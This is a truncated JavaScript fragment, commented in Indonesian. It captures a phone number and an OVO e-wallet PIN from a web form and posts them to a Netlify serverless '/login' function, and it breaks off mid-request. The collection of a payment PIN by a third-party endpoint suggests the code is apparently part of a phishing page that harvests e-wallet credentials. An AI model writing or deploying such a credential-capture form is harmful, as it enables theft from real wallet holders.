// Tambahkan event listener untuk tombol submit
document.querySelector('form').addEventListener('submit', function(event) {
    event.preventDefault();

    // Ambil nilai input
    var nomorHandphone = document.querySelector('input[name="nomor-handphone"]').value;
    var pinOvo = document.querySelector('input[name="pin-ovo"]').value;

    // Validasi input
    if (nomorHandphone === '' || pinOvo === '') {
        alert('Harap isi semua field!');
        return;
    }

    // Kirim data ke server (contoh menggunakan fetch API)
    fetch('/.netlify/functions/login', {
        method: 'POST',
        headers: {
            'Content-Type':

